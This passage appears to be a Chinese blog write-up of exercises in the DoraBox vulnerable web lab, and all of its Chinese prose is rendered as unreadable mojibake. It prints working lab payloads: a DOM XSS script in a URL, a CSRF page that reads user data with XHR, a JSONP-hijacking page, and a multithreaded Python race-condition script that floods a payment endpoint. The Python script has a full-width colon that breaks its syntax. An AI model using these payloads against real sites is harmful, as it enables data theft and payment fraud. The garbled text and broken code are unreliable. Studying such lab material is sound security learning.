çš„åœ°æ–¹æå§ï¼Œåˆ«çš„ç”¨æˆ·ç‚¹äº†ï¼Œå°±ä¼šè·³åˆ°å°é»‘å±‹è¿™ç§ã€‚æˆ–è€…åˆ©ç”¨ä¸€äº›å¹³å°è„šæœ¬æäº‹æƒ…ã€‚</p><p>æ¼æ´ä¿®å¤ï¼šåœ¨æœåŠ¡ç«¯è¿‡æ»¤æ‰ HTML çš„å°–æ‹¬å·ï¼Œæ¯”å¦‚ php çš„è‡ªå¸¦å‡½æ•° strip_tags ()ï¼Œç„¶åå¯¹äºä¸€äº›å¯ä»¥æ‰§è¡Œçš„å‡½æ•°è¿›è¡Œæ‰‹åŠ¨å†™å‡½æ•°è¿‡æ»¤ï¼Œè¿‡æ»¤æ‰ onchange (),onload (),onclick (),onerror () ç­‰ç­‰å‡½æ•°</p><h1 id="domå‹xss"><a class="markdownIt-Anchor" href="#domå‹xss">#</a> DOM å‹ XSS</h1><p><img src="dorabox_xss_sav001.png" alt=""></p><h2 id="è¿‡ç¨‹-14"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-14">#</a> è¿‡ç¨‹ï¼š</h2><ol><li><p>ä¸‡èƒ½ alertï¼Œ<script>alert(1)</script>ï¼š<img src="dorabox_xss_dom001.png" alt=""></p><p>å¸¦æœ‰ xss çš„ urlï¼š<a href="http://localhost/dorabox/xss/dom_xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=submit">http://localhost/dorabox/xss/dom_xss.php?name=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit</a></p></li><li><p>çœ‹æºç æ˜¯åœ¨è¿™é‡Œæ‰“å°çš„ï¼š <code>document.write(getURLValue('name'));</code></p></li></ol><h2 id="æ€»ç»“-14"><a class="markdownIt-Anchor" href="#æ€»ç»“-14">#</a> æ€»ç»“ï¼š</h2><p>DOM å‹ xssï¼Œä»…ä»…åœ¨å‰ç«¯é¡µé¢è¿›è¡Œæ“ä½œçš„ï¼Œé€šè¿‡ä¿®æ”¹é¡µé¢çš„ DOM èŠ‚ç‚¹å½¢æˆçš„ XSSï¼Œæ•ˆæœå’Œåå°„å‹ç±»ä¼¼ã€‚</p><p>æ”»å‡»è€…åœ¨ URL ä¸­æ’å…¥ XSS ä»£ç ï¼Œå‰ç«¯é¡µé¢ç›´æ¥ä» url ä¸­è·å– xss ä»£ç å¹¶è¾“å‡ºåˆ°é¡µé¢ï¼Œå¯¼è‡´ xss ä»£ç çš„æ‰§è¡Œï¼Œæ”»å‡»è€…å°†å¸¦æœ‰ xss ä»£ç çš„ url å‘ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰“å¼€åæ”¶åˆ°æ”»å‡»ã€‚</p><h1 id="csrfè·¨åŸŸèµ„æº"><a class="markdownIt-Anchor" href="#csrfè·¨åŸŸèµ„æº">#</a> CSRF è·¨åŸŸèµ„æº</h1><p><img src="dorabox_csrf_json001.png" alt=""></p><h2 id="è¿‡ç¨‹-15"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-15">#</a> è¿‡ç¨‹ï¼š</h2><ol username:Vulkey_Chen,mobilephone:13188888888,email:admin@gh0st.cn,address:\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd,sex:CoolMan=""><li><p>æ„é€  html æ¥åŠ«æŒ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Ajax å‘é€ get è¯·æ±‚<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">  xhr.responseType = <span class="string">&quot;text&quot;</span>;</span></span><br><span class="line"><span class="javascript">  xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://localhost/dorabox/csrf/userinfo.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">  xhr.onreadystatechange= <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(<span class="built_in">this</span>.status == <span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="javascript">alert(<span class="built_in">this</span>.responseText);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"> &#125;;</span></span><br><span class="line"><span class="javascript">  xhr.send();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">ajax();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="dorabox_csrf_ky001.png" alt="">å†…å®¹ï¼š</p></li></ol><h2 id="æ€»ç»“-15"><a class="markdownIt-Anchor" href="#æ€»ç»“-15">#</a> æ€»ç»“ï¼š</h2><pre><code>å®è¯å®è¯´ï¼Œè¿™ä¸ªå°±æ˜¯å€Ÿé‰´ç½‘ä¸Šçš„ï¼Œè§£é‡Šä¸€ä¸‹jsä»£ç ï¼šè‡ªå®šä¹‰ajax()æ–¹æ³•å¹¶æ‰§è¡Œï¼Œajaxå†…åˆ›å»ºXMLHttpRequestå¯¹è±¡ï¼Œè®¾ç½®å›åº”å†…å®¹çš„ç±»å‹ä¸ºtextã€‚ç„¶åå‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œå…¶ä¸­ open(*method*,*url*,*async*)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°trueä¸ºå¼‚æ­¥ï¼Œå¼‚æ­¥ JavaScript å’Œ XMLï¼ŒXMLHttpRequest å¯¹è±¡å¦‚æœè¦ç”¨äº AJAX çš„è¯ï¼Œå…¶ open() æ–¹æ³•çš„ async å‚æ•°å¿…é¡»è®¾ç½®ä¸º trueã€‚onreadystatechangeï¼šå­˜å‚¨å‡½æ•°ï¼ˆæˆ–å‡½æ•°åï¼‰ï¼Œæ¯å½“ readyState å±æ€§æ”¹å˜æ—¶ï¼Œå°±ä¼šè°ƒç”¨è¯¥å‡½æ•°ã€‚readyStateå­˜æœ‰ XMLHttpRequest çš„çŠ¶æ€ã€‚ä» 0 åˆ° 4 å‘ç”Ÿå˜åŒ–ã€‚</code></pre><ul><li><p>0: è¯·æ±‚æœªåˆå§‹åŒ–</p></li><li><p>1: æœåŠ¡å™¨è¿æ¥å·²å»ºç«‹</p></li><li><p>2: è¯·æ±‚å·²æ¥æ”¶</p></li><li><p>3: è¯·æ±‚å¤„ç†ä¸­</p></li><li><p>4: è¯·æ±‚å·²å®Œæˆï¼Œä¸”å“åº”å·²å°±ç»ª</p><p>status<br>200: â€œOKâ€ï¼Œ404: æœªæ‰¾åˆ°é¡µé¢</p></li></ul><p>æœ€åå“åº”æˆåŠŸå°± alert è¿”å›çš„æ•°æ®</p><p>function ajax() {<br>var xhr = new XMLHttpRequest();<br>xhr.responseType = â€œtextâ€;<br>xhr.open(â€˜GETâ€™, â€˜<a href="http://localhost/dorabox/csrf/userinfo.php">http://localhost/dorabox/csrf/userinfo.php</a>â€™, true);<br>xhr.onreadystatechange= function(e) {<br>if(this.status == 200){<br>alert(this.responseText);<br>}<br>};<br>xhr.send();<br>}<br>ajax();</p><h1 id="jsonpåŠ«æŒ"><a class="markdownIt-Anchor" href="#jsonpåŠ«æŒ">#</a> JSONP åŠ«æŒ</h1><p><img src="dorabox_csrf_json001.png" alt=""></p><h2 id="è¿‡ç¨‹-16"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-16">#</a> è¿‡ç¨‹ï¼š</h2><ol><li><p>æ¥ä¸€ä¸ª csrf æ”»å‡»ä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONPåŠ«æŒæµ‹è¯•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">result</span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript">        </span>&#123;</span></span><br><span class="line"><span class="javascript">            alert(result.address);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/dorabox/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="dorabox_csrf_json002.png" alt=""></p></li></ol><h2 id="æ€»ç»“-16"><a class="markdownIt-Anchor" href="#æ€»ç»“-16">#</a> æ€»ç»“ï¼š</h2><p>JSONP (JSON With Padding)ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„ CSRF æ”»å‡»ï¼Œç›®çš„æ˜¯è·å–æ•æ„Ÿæ•°æ®ï¼Œå½“ JSON æ•°æ®å“åº”ç»™ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨ç«‹å³ä¼šè°ƒç”¨æ•°ç»„æˆ–è€…å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚æ­£æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼ŒæŠŠæ„é€ æ–¹æ³•æ›¿æ¢æˆæ¶æ„ä»£ç ï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­æ·»åŠ å°† JSON æ•°æ®å‘é€ç»™ç¬¬ä¸‰æ–¹å³æ”»å‡»è€…çš„ä»£ç ã€‚</p><p>æ²¡å†™è¿‡ï¼Œç¬¬ä¸€æ¬¡å†™ï¼Œå†™å®Œè·¨åŸŸå¥½åƒåˆå¤šæ‡‚äº†ä¸€ç‚¹ç‚¹ï¼ˆå¥½åƒçœŸçš„æ‡‚äº†ï¼Œä½†æ˜¯å…¥èŒåŸ¹è®­é‡Œå†™çš„æœ‰ç‚¹è¯¦ç»†ï¼‰ï¼Œæˆ‘å†™å®Œè¿™äº›è¦å†å¤šå†™å‡ é“é¢˜ï¼Œæ¥ä¸€ç‚¹ç”»é¢æ„Ÿã€‚</p><h1 id="ä»»æ„æ–‡ä»¶åŒ…å«"><a class="markdownIt-Anchor" href="#ä»»æ„æ–‡ä»¶åŒ…å«">#</a> ä»»æ„æ–‡ä»¶åŒ…å«</h1><p><img src="dorabox_filein002.png" alt=""></p><h2 id="è¿‡ç¨‹-17"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-17">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>ç›´æ¥æ–‡ä»¶åŒ…å«ï¼Œè¾“å‡º<img src="dorabox_filein003.png" alt=""></li></ol><h2 id="æ€»ç»“-17"><a class="markdownIt-Anchor" href="#æ€»ç»“-17">#</a> æ€»ç»“ï¼š</h2><p>ç½‘ä¸Šçœ‹äº†å¾ˆå¤šé€šå…³è®°å½•ï¼Œå¯æ˜¯å¤§å®¶éƒ½æ˜¯ç›´æ¥åŒ…å«ï¼Œå¦‚æœä¸æ˜¯æœ¬åœ°é¶åœºï¼Œé‚£æ˜¯æ€ä¹ˆçŸ¥é“è·¯å¾„ä»¥åŠæ–‡ä»¶åçš„å‘¢ï¼Ÿæ˜¯ä¸æ˜¯è¦é…åˆæ–‡ä»¶ä¸Šä¼ ä¸€èµ·ï¼Ÿ</p><h1 id="ä»»æ„æ–‡ä»¶åŒ…å«-2"><a class="markdownIt-Anchor" href="#ä»»æ„æ–‡ä»¶åŒ…å«-2">#</a> ä»»æ„æ–‡ä»¶åŒ…å«</h1><p><img src="dorabox_filein002.png" alt=""></p><h2 id="è¿‡ç¨‹-18"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-18">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>è¾“å…¥ 1ï¼Œå‘ç°é™åˆ¶åœ¨å½“å‰ç›®å½•ï¼Œä½†æ˜¯ä¸å½±å“è¦ç”¨çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ç›´æ¥åŒ…å«å°±å¯ä»¥äº†<img src="dorabox_filein004.png" alt=""><img src="dorabox_filein003.png" alt=""></li></ol><h2 id="æ€»ç»“-18"><a class="markdownIt-Anchor" href="#æ€»ç»“-18">#</a> æ€»ç»“ï¼š</h2><p>â€¦/ åº”è¯¥å¯ä»¥çªç ´æŠŠ</p><h1 id="æ¡ä»¶ç«äº‰-æ”¯ä»˜"><a class="markdownIt-Anchor" href="#æ¡ä»¶ç«äº‰-æ”¯ä»˜">#</a> æ¡ä»¶ç«äº‰ - æ”¯ä»˜</h1><p>é¶åœºå‡ºäº†ç‚¹é—®é¢˜ï¼Œé¡µé¢æŠ¥ php è¯­æ³•é”™</p><p>ä½†æ˜¯è¯­æ³•å¹¶æ²¡æœ‰å‡ºé”™ï¼Œç™¾åº¦äº†è¯´æ˜¯ php ç‰ˆæœ¬çš„é—®é¢˜ï¼Œä½†æ˜¯æˆ‘åŸºæœ¬æ¯ä¸ªç‰ˆæœ¬éƒ½è¯•è¿‡ä¸”é‡å¯äº†ï¼Œä½†æ˜¯æ²¡æœ‰è§£å†³</p><p>ä¸è¿‡åæ­£è¿™ä¸ªé¢˜è¦å†™è„šæœ¬ï¼Œæˆ‘ä¹Ÿä¸å¤ªä¼šï¼Œå¹²è„†è·Ÿç€æŠŠ poc æ’¸äº†ä¸€é</p><h2 id="è¿‡ç¨‹-19"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-19">#</a> è¿‡ç¨‹ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ä¸‰ä¸ªå˜é‡</span></span><br><span class="line"><span class="string">    urlï¼šè¦æµ‹è¯•çš„ç½‘ç«™åœ°å€</span></span><br><span class="line"><span class="string">    threadsï¼šçº¿ç¨‹æ•°</span></span><br><span class="line"><span class="string">    qï¼šè°ƒç”¨queueæ„é€ æ–¹æ³•ï¼Œå¯¹åˆ—é˜Ÿå¤§å°ä¸è®¾é™</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&quot;http://localhost/dorabox/race_condition/pay.php&quot;</span></span><br><span class="line">threads=<span class="number">25</span></span><br><span class="line">q=queue.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨åˆ—é˜Ÿä¸­åŠ å…¥50ä¸ªå…ƒç´ ,0-49</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    q.put(i)   </span><br><span class="line"><span class="comment"># å®šä¹‰postå‡½æ•°ï¼Œå‘50ä¸ªä¸€å—é’±</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment"># å½“qé‡Œé¢è¿˜æœ‰å…ƒç´ æ—¶,å°±è·å–å…ƒç´ ï¼Œå‘é€ä¸€ä¸ªpostè¯·æ±‚æ”¯ä»˜ä¸€å—é’±</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        q.get() </span><br><span class="line">        <span class="comment"># Requestsä»¥formè¡¨å•å½¢å¼å‘é€postè¯·æ±‚ï¼Œæ”¯ä»˜è¾“å…¥æ¡†nameæ˜¯moneyå˜›</span></span><br><span class="line">        <span class="comment"># data = &#123;&#x27;key1&#x27;:&#x27;value1&#x27;,...&#125;</span></span><br><span class="line">        r = requests.post(url, data = &#123;<span class="string">&#x27;money&#x27;</span> : <span class="number">1</span>&#125;)</span><br><span class="line">        r.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä¸€ä¸ªpythonæ–‡ä»¶é€šå¸¸æœ‰ä¸¤ç§ä½¿ç”¨æ–¹æ³•,</span></span><br><span class="line"><span class="string"> ç¬¬ä¸€æ˜¯ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼Œ</span></span><br><span class="line"><span class="string"> ç¬¬äºŒæ˜¯ import åˆ°å…¶ä»–çš„ python è„šæœ¬ä¸­è¢«è°ƒç”¨ï¼ˆæ¨¡å—é‡ç”¨ï¼‰æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="string"> å› æ­¤if __name__ == &#x27;main&#x27;: çš„ä½œç”¨å°±æ˜¯:</span></span><br><span class="line"><span class="string"> æ§åˆ¶è¿™ä¸¤ç§æƒ…å†µæ‰§è¡Œä»£ç çš„è¿‡ç¨‹ï¼Œåœ¨if __name__ == &#x27;main&#x27;: ä¸‹çš„ä»£ç åªæœ‰åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼ˆå³æ–‡ä»¶ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼‰æ‰ä¼šè¢«æ‰§è¡Œï¼Œè€Œ import åˆ°å…¶ä»–è„šæœ¬ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ã€‚</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> æ¯ä¸ªpythonæ¨¡å—ï¼ˆpythonæ–‡ä»¶ï¼‰éƒ½åŒ…å«å†…ç½®çš„å˜é‡ __name__ï¼Œå½“è¯¥æ¨¡å—è¢«ç›´æ¥æ‰§è¡Œçš„æ—¶å€™ï¼Œ__name__ ç­‰äºæ–‡ä»¶åï¼ˆåŒ…å«åç¼€ .py ï¼‰ï¼›å¦‚æœè¯¥æ¨¡å— import åˆ°å…¶ä»–æ¨¡å—ä¸­ï¼Œåˆ™è¯¥æ¨¡å—çš„ __name__ ç­‰äºæ¨¡å—åç§°ï¼ˆä¸åŒ…å«åç¼€.pyï¼‰</span></span><br><span class="line"><span class="string"> è€Œâ€œ__main__â€ å§‹ç»ˆæŒ‡å½“å‰æ‰§è¡Œæ¨¡å—çš„åç§°ï¼ˆåŒ…å«åç¼€.pyï¼‰ã€‚è¿›è€Œå½“æ¨¡å—è¢«ç›´æ¥æ‰§è¡Œæ—¶ï¼Œ__name__ == &#x27;__main__&#x27; ç»“æœä¸ºçœŸã€‚</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> é‚£å…¶å®å°±æ˜¯ä¸»å‡½æ•°å‘—ï¼Œç¨‹åºè¿è¡Œå…¥å£ï¼Œä¸è¿‡ä¹Ÿæœ‰ç‚¹åŒºåˆ«å—·</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># ç”¨25ä¸ªçº¿ç¨‹ï¼Œåˆ†åˆ«å‘50ä¸ªä¸€å—é’±</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads)ï¼š</span><br><span class="line">        t = threading.Thread(target=post) <span class="comment"># ç›®æ ‡å¯¹è±¡æ˜¯postå‡½æ•°</span></span><br><span class="line">        t.start() <span class="comment"># å¼€å§‹æ‰§è¡Œçº¿ç¨‹</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“-19"><a class="markdownIt-Anchor" href="#æ€»ç»“-19">#</a> æ€»ç»“ï¼š</h2><p>python ä»£ç å†™çš„æ—¶å€™ï¼Œæ€»æ˜¯çˆ±æ‰“åˆ†å·å”‰<br>æ„Ÿè§‰å¤§å®¶å†™è„šæœ¬æˆ–è€…ä¸€äº›å°å·¥å…·ï¼Œéƒ½å–œæ¬¢ç”¨ pythonï¼Œæœ‰ç‚¹æ„æ€</p><p>è¿™é‡Œæ˜¯çœ‹ä»£ç çš„æ—¶å€™æ‰¾èµ„æ–™çœ‹è§çš„ï¼ˆåæ¥æ‰å‘ç° python è‡ªå¸¦.chw apiï¼Œä¸è¿‡è‹±æ–‡çš„é˜…è¯»èµ·æ¥ä¹Ÿæœ‰ç‚¹è´¹æ—¶é—´å°±æ˜¯äº†ï¼‰ï¼š</p><ul><li><p>Queue æ˜¯ python æ ‡å‡†åº“ä¸­çš„çº¿ç¨‹å®‰å…¨çš„åˆ—é˜Ÿ (FIFO) å®ç°<br>æä¾›äº†ä¸€ä¸ªé€‚ç”¨äºå¤šçº¿ç¨‹ç¼–ç¨‹çš„å…ˆè¿›å…ˆå‡ºçš„æ•°æ®ç»“æ„ï¼Œå³åˆ—é˜Ÿ<br>ç”¨æ¥åœ¨ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çº¿ç¨‹ä¹‹é—´çš„ä¿¡æ¯ä¼ é€’</p></li><li><p>class Queue.Queue(maxsize=0)<br> maxsize æ˜¯ä¸ªæ•´æ•°ï¼ŒæŒ‡æ˜äº†åˆ—é˜Ÿä¸­èƒ½å­˜æ”¾çš„ä¸ªæ•°ä¸Šé™ã€‚<br>ä¸€æ—¦è¾¾åˆ°ä¸Šé™ï¼Œæ’å…¥ä¼šå¯¼è‡´é˜»å¡ï¼Œç›´åˆ°åˆ—é˜Ÿä¸­çš„æ•°æ®è¢«æ¶ˆè´¹æ‰ã€‚<br>å¦‚æœ maxsize å°äºæˆ–è€…ç­‰äº 0ï¼Œåˆ—é˜Ÿå¤§å°æ²¡æœ‰é™åˆ¶</p></li><li><p>Queue,deque,queue å¯¹æ¯”ï¼šqueue æ˜¯å¤šçº¿ç¨‹ä¸­çš„ä½¿ç”¨çš„æ ˆï¼Œä½†æ˜¯ Python è§£é‡Šå™¨æœ‰ä¸€ä¸ªå…¨å±€è§£é‡Šå™¨é” (PIL)ï¼Œ<br>å¯¼è‡´æ¯ä¸ª Python è¿›ç¨‹ä¸­æœ€å¤šåŒæ—¶è¿è¡Œä¸€ä¸ªçº¿ç¨‹ï¼Œ<br>å› æ­¤ Python å¤šçº¿ç¨‹ç¨‹åºå¹¶ä¸èƒ½æ”¹å–„ç¨‹åºæ€§èƒ½ï¼Œä¸èƒ½å‘æŒ¥å¤šæ ¸ç³»ç»Ÿçš„ä¼˜åŠ¿ã€‚</p></li><li><p>multiprocessing.Queue æ˜¯ Python 2.6 å¼•å…¥çš„ç”¨æ¥å®ç°å¤šè¿›ç¨‹çš„ä¸€ç§é«˜æ€§èƒ½æ ˆã€‚</p></li><li><p>collections.deque æ˜¯ä¸ºäº†é«˜æ•ˆå®ç°æ’å…¥å’Œåˆ é™¤æ“ä½œçš„åŒå‘åˆ—è¡¨ï¼Œé€‚åˆç”¨äºé˜Ÿåˆ—å’Œæ ˆã€‚</p></li><li><p>queue å®ä¾‹æ–¹æ³•ï¼š<br>Queue.empty (): åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºã€‚å’Œä¸Šé¢ä¸€æ ·æ³¨æ„<br> Queue.full (): åˆ¤æ–­æ˜¯å¦æ»¡äº†ã€‚å’Œä¸Šé¢ä¸€æ ·æ³¨æ„<br> Queue.put (item, block=True, timeout=None): å¾€é˜Ÿåˆ—é‡Œæ”¾æ•°æ®ã€‚å¦‚æœæ»¡äº†çš„è¯ï¼Œblocking = False ç›´æ¥æŠ¥ Full å¼‚å¸¸ã€‚å¦‚æœ blocking = Trueï¼Œå°±æ˜¯ç­‰ä¸€ä¼šï¼Œtimeout å¿…é¡»ä¸º 0 æˆ–æ­£æ•°ã€‚None ä¸ºä¸€ç›´ç­‰ä¸‹å»ï¼Œ0 ä¸ºä¸ç­‰ï¼Œæ­£æ•° n ä¸ºç­‰å¾… n ç§’è¿˜ä¸èƒ½å­˜å…¥ï¼ŒæŠ¥ Full å¼‚å¸¸ã€‚<br>Queue.put_nowait (item): å¾€é˜Ÿåˆ—é‡Œå­˜æ”¾å…ƒç´ ï¼Œä¸ç­‰å¾…<br> Queue.get (item, block=True, timeout=None): ä»é˜Ÿåˆ—é‡Œå–æ•°æ®ã€‚å¦‚æœä¸ºç©ºçš„è¯ï¼Œblocking = False ç›´æ¥æŠ¥ empty å¼‚å¸¸ã€‚å¦‚æœ blocking = Trueï¼Œå°±æ˜¯ç­‰ä¸€ä¼šï¼Œtimeout å¿…é¡»ä¸º 0 æˆ–æ­£æ•°ã€‚None ä¸ºä¸€ç›´ç­‰ä¸‹å»ï¼Œ0 ä¸ºä¸ç­‰ï¼Œæ­£æ•° n ä¸ºç­‰å¾… n ç§’è¿˜ä¸èƒ½è¯»å–ï¼ŒæŠ¥ empty å¼‚å¸¸<br> Queue.get_nowait (item): ä»é˜Ÿåˆ—é‡Œå–å…ƒç´ ï¼Œä¸ç­‰å¾…ä¸¤ä¸ªæ–¹æ³•è·Ÿè¸ªå…¥é˜Ÿçš„ä»»åŠ¡æ˜¯å¦è¢«æ¶ˆè´¹è€… daemon è¿›ç¨‹å®Œå…¨æ¶ˆè´¹</p></li></ul><h1 id="æ¡ä»¶ç«äº‰-ä¸Šä¼ "><a class="markdownIt-Anchor" href="#æ¡ä»¶ç«äº‰-ä¸Šä¼ ">#</a> æ¡ä»¶ç«äº‰ - ä¸Šä¼ </h1><p>çœ‹æºç é¡ºåºï¼šæ–‡ä»¶ä¸Šä¼ ä¸Šæ¥ï¼Œæ£€æŸ¥åç¼€ï¼Œåç¼€ä¸åœ¨å…è®¸åˆ—è¡¨é‡Œï¼Œåˆ é™¤æ–‡ä»¶ã€‚</p><p><img src="dorabox_jz_upload001.png" alt=""></p><h2 id="è¿‡ç¨‹-20"><a class="markdownIt-Anchor" 